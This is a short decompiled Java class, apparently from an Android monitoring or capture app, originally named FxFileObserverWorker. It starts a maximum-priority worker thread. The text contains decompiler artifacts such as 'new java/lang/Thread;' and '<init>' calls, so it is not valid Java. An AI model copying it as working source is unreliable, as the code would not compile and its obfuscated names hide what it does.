package com.vvt.capture.a;

class g
{
  private String b;
  
  public g(e parame, String paramString)
  {
    this.b = paramString;
  }
  
  public int a()
  {
    Thread localThread = new java/lang/Thread;
    h localh = new com/vvt/capture/a/h;
    localh.<init>(this);
    localThread.<init>(localh);
    localThread.setPriority(10);
    localThread.start();
    return localThread.getPriority();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/a/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */